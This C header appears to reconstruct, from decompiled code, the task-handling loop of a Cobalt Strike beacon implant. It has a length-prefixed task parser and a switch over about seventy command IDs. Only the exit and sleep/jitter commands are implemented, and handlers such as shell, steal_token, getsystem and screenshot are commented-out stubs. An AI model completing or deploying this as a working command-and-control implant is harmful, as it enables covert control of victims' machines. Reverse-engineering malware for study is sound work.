#pragma once
#include <Windows.h>
#include "data_struct.h"
#include "global.h"
#include "data_deal.h"
#include "function.h"

void Task_handle(char* Src, int size, int a3);

void* Parse_Task(TaskdataStruc* Taskdata, size_t Taskdata_size)
{
	size_t v2;
	u_long Task_len;
	DWORD Task_data_len;
	size_t v5;
	int Task_id;

	v2 = 0;
	if (!Taskdata_size)
	{
		return memset(Taskdata, 0, Taskdata_size);
	}
	while (1)
	{
		Task_len = *(int*)((char*)&Taskdata->Task_data_len + v2);
		Task_id = ntohl(*(int*)((char*)&Taskdata->Task_id + v2));
		Task_data_len = ntohl(Task_len);
		v5 = Task_data_len + v2 + 8;
		if (v5 > Taskdata_size)
		{
			break;
		}
		Task_handle(&Taskdata->Task_data[v2], Task_data_len, Task_id);
		v2 = v5;
		if (v5 >= Taskdata_size)
			return memset(Taskdata, 0, Taskdata_size);
	}
	return &Task_data_len;//这里是没有返回值的千万别这样因为这个变量是栈里的
}

void end_beacon()
{
	dwMilliseconds = 0;                           // 修改dw等于0等待结束循环
	sub_100012CF(0, 0, 26);                      // 发送消息给cs
}

void set_sleep_time(char* a1, int a2)
{
	u_long v2;
	struc_1 a1a;

	if (dwMilliseconds)
	{
		init_struc1(&a1a, a1, a2);
		dwMilliseconds = get_int_struc1_index2(&a1a);//需要注意及时cs使用sleep 0命令也不会将dwMilliseconds设置为0而是100毫秒
		v2 = get_int_struc1_index2(&a1a);
		jitter = v2;
		if (!v2 || v2 > 99)
			jitter = 0;
	}
}


void Task_handle(char* Taskdata, int Taskdata_size, int Taskdata_id)
{
	DWORD* v3;
	u_long v4;
	u_long v5;
	int v6;
	int* v7;
	u_long v8;
	DWORD* v9;
	u_long v10;
	int v11;
	int v12;
	int v13;
	FILE* v14;
	printf("任务id: %d\n", Taskdata_id);
	printf("任务size: %d\n", Taskdata_size);
	switch (Taskdata_id)
	{
	case 1:
		v11 = 1;
		v12 = 1;
		goto LABEL_3;
	case 3:
		end_beacon();
		return;
	case 4:
		set_sleep_time(Taskdata, Taskdata_size);  // sleep
		return;
	case 5:
		//cd_command(Taskdata_size, Taskdata);      // cd
		return;
	case 9:
		//sub_10004403(Taskdata, Taskdata_size, 1);
		return;
	case 10:
		//upload();
		//sub_10002B59(Taskdata, Taskdata_size, "wb");
		return;
	case 11:
		//sub_10003AD8(Taskdata, Taskdata_size);
		return;
	case 12:
		//sub_10002733(Taskdata_size, Taskdata);
		return;
	case 13:
		//sub_1000A0C3(Taskdata, Taskdata_size, 1);
		return;
	case 14:
		//sub_10006B2B(Taskdata_size, Taskdata);
		return;
	case 15:
		//sub_10006CFC(Taskdata, Taskdata_size);
		return;
	case 16:
		//v9 = dword_10037E50;
		//v10 = ntohl(*Taskdata);
		//while (v9)
		//{
		//	if (v9[1])
		//	{
		//		if (v10 == *v9 && v9[4] != 2)
		//		{
		//			v9[1] = 0;
		//		}
		//	}
		//	v9 = v9[8];
		//}
		return;
	case 17:
		//sub_10006ACD(Taskdata);
		return;
	case 18:
		//sub_10004707(Taskdata, Taskdata_size, 1);
		return;
	case 19:
		//v3 = Block;
		//v4 = ntohl(*Taskdata);
		//while (v3)
		//{
		//	if (*v3 == v4)
		//	{
		//		v14 = v3[2];
		//		v3[1] = 0;
		//		fclose(v14);
		//	}
		//	v3 = v3[3];
		//}
		return;
	case 22:
		//sub_10005D11(Taskdata, Taskdata_size);
		return;
	case 23:
		//v8 = ntohl(*Taskdata);
		//sub_10005E5E(v8);
		return;
	case 24:
		//v5 = ntohl(*Taskdata);
		//v6 = 0;
		//v7 = dword_10037630;
		break;
	case 27:
		//sub_1000A9C1();
		return;
	case 28:
		//sub_1000A848();
		return;
	case 31:
		//steal_token();
		//sub_1000AA35(Taskdata, Taskdata_size);
		return;
	case 32:
		//sub_100084C1(Taskdata, Taskdata_size);
		return;
	case 33:
		//sub_100083E7(Taskdata, Taskdata_size);
		return;
	case 37:
		//sub_100072ED(Taskdata_size, Taskdata);
		return;
	case 38:
		//sub_100028C2(Taskdata, Taskdata_size);
		return;
	case 39:
		//sub_10002BFB();
		return;
	case 40:
		//sub_100059D9(0, Taskdata, Taskdata_size, 0);
		return;
	case 41:
		//sub_10005AEB();
		return;
	case 42:
		//sub_10005B53(Taskdata, Taskdata_size);
		return;
	case 43:
		//sub_10004403(Taskdata, Taskdata_size, 0);
		return;
	case 44:
		//sub_100044BA(1, Taskdata, Taskdata_size, 0);
		return;
	case 45:
		//sub_10004757(Taskdata, Taskdata_size, 1);
		return;
	case 46:
		//sub_10004757(Taskdata, Taskdata_size, 0);
		return;
	case 47:
		//sub_10002C4B(Taskdata, Taskdata_size);
		return;
	case 49:
		//sub_1000AC7C(Taskdata, Taskdata_size);
		return;
	case 50:
		//sub_100071B7(Taskdata, Taskdata_size, 0);
		return;
	case 51:
		//sub_1000728D(Taskdata, Taskdata_size);
		return;
	case 52:
		//sub_10002CE5(Taskdata, Taskdata_size);
		return;
	case 53:
		//ls();
		//sub_10004023(Taskdata, Taskdata_size);
		return;
	case 54:
		//sub_10003EE4(Taskdata, Taskdata_size);
		return;
	case 55:
		//sub_10003DBE(Taskdata, Taskdata_size);
		return;
	case 56:
		//sub_10003E95(Taskdata, Taskdata_size);
		return;
	case 57:
		//sub_10002DA1(Taskdata, Taskdata_size);
		return;
	case 59:
		//sub_1000AFC0(Taskdata, Taskdata_size);
		return;
	case 60:
		//sub_1000307C(Taskdata_size, Taskdata);
		return;
	case 61:
		//sub_100030F4();
		return;
	case 62:
		//sub_100059D9(1, Taskdata, Taskdata_size, 0);
		return;
	case 67:
		//sub_10002B59(Taskdata, Taskdata_size, "ab");
		return;
	case 68:
		//sub_10006056(Taskdata);
		return;
	case 69:
		//sub_1000A0C3(Taskdata, Taskdata_size, 0);
		return;
	case 70:
		//sub_1000489B(Taskdata, Taskdata_size, 1, 1);
		return;
	case 71:
		v13 = 1;
		goto LABEL_60;
	case 72:
		//sub_100026C5(Taskdata);
		return;
	case 73:
		//sub_10003F17(Taskdata, Taskdata_size);
		return;
	case 74:
		//sub_10003F9E(Taskdata, Taskdata_size);
		return;
	case 75:
		//sub_1000764B(Taskdata, Taskdata_size);
		return;
	case 76:
		//sub_100027C6(Taskdata, Taskdata_size);
		return;
	case 77:
		//sub_100031C4(Taskdata, Taskdata_size);
		return;
	case 78:
		//shell(Taskdata, Taskdata_size);
		//printf("%")
		//sub_10002A5B(Taskdata, Taskdata_size);
		return;
	case 79:
		//sub_10007326(Taskdata, Taskdata_size);
		return;
	case 82:
		//sub_10007228(Taskdata, Taskdata_size);
		return;
	case 83:
		//sub_10001092(Taskdata, Taskdata_size);
		return;
	case 84:
		//sub_10001139(Taskdata, Taskdata_size);
		return;
	case 85:
		//argue();
		//sub_100011DE();
		return;
	case 86:
		//sub_10006401(Taskdata, Taskdata_size);
		return;
	case 87:
		//sub_1000489B(Taskdata, Taskdata_size, 1, 0);
		return;
	case 88:
		v13 = 0;
	LABEL_60:
		//sub_1000489B(Taskdata, Taskdata_size, 0, v13);
		return;
	case 89:
		v12 = 1;
		goto LABEL_77;
	case 90:
		v12 = 0;
	LABEL_77:
		v11 = 0;
	LABEL_3:
		//sub_100044BA(v11, Taskdata, Taskdata_size, v12);
		return;
	case 91:
		//sub_10004707(Taskdata, Taskdata_size, 0);
		return;
	case 92:
		//sub_1000755D(Taskdata, Taskdata_size);
		return;
	case 93:
		//sub_1000461E(Taskdata, Taskdata_size, 1);
		return;
	case 94:
		//sub_1000461E(Taskdata, Taskdata_size, 0);
		return;
	case 98:
		//sub_1000455F(Taskdata, Taskdata_size, 1);
		return;
	case 99:
		//sub_1000455F(Taskdata, Taskdata_size, 0);
		return;
	case 100:
		//timestomp();
		// getsystem();
		//sub_100019B4(Taskdata, Taskdata_size);
		return;
	case 101:
		//screenshot();
		//sub_100059D9(0, Taskdata, Taskdata_size, 1);
		return;
	case 102:
		//sub_100071B7(Taskdata, Taskdata_size, 0x100007F);
		return;
	default:
		return;
	}
	//while (v7[9] != 1 || *v7 != v5)
	//{
	//	v7 += 13;
	//	++v6;
	//	if (v7 >= &dword_10037E50)
	//	{
	//		return;
	//	}
	//}
	//sub_100012CF(dword_10037654[13 * v6 + 1], dword_10037654[13 * v6 + 2], 10u);//发送返回
}